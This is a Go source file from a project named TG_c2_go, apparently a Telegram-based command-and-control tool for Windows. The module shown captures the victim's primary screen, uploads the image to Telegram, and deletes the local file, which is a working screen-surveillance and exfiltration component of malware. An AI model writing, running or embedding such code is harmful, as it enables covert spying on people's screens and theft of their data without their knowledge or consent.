//go:build windows

package functions

import (
	"fmt"
	"image/png"
	"os"
	"path/filepath"

	"github.com/kbinani/screenshot"

	"TG_c2_go/config"
	"TG_c2_go/telegram"
)

// ScreenCapture 屏幕截图功能
type ScreenCapture struct {
	client *telegram.TelegramClient
}

// NewScreenCapture 创建新的屏幕截图器
func NewScreenCapture() *ScreenCapture {
	return &ScreenCapture{
		client: telegram.NewTelegramClient(),
	}
}

// TakeScreenshot 执行屏幕截图并发送到Telegram
func (sc *ScreenCapture) TakeScreenshot() error {
	fmt.Println("开始截图...")
	
	// 确保输出目录存在
	if err := os.MkdirAll(config.OUTPUT_DIR, 0755); err != nil {
		return fmt.Errorf("创建输出目录失败: %v", err)
	}
	
	// 获取显示器数量
	displayCount := screenshot.NumActiveDisplays()
	if displayCount == 0 {
		return fmt.Errorf("没有检测到活动显示器")
	}
	
	fmt.Printf("检测到 %d 个显示器\\n", displayCount)
	
	// 截取主显示器（索引0）的屏幕
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return fmt.Errorf("截图失败: %v", err)
	}
	
	// 保存截图到文件
	screenshotPath := filepath.Join(config.OUTPUT_DIR, "screenshot.png")
	file, err := os.Create(screenshotPath)
	if err != nil {
		return fmt.Errorf("创建截图文件失败: %v", err)
	}
	defer file.Close()
	
	// 将图像编码为PNG格式
	err = png.Encode(file, img)
	if err != nil {
		return fmt.Errorf("保存截图失败: %v", err)
	}
	
	fmt.Printf("截图已保存到: %s\\n", screenshotPath)
	
	// 发送截图到Telegram
	fmt.Println("正在上传截图到Telegram...")
	err = sc.client.SendPhoto(screenshotPath)
	if err != nil {
		fmt.Printf("上传截图失败: %v\\n", err)
		return err
	}
	
	// 删除本地截图文件
	if err := os.Remove(screenshotPath); err != nil {
		fmt.Printf("删除截图文件失败: %v\\n", err)
	} else {
		fmt.Println("截图文件已删除")
	}
	
	fmt.Println("截图上传完成")
	return nil
}
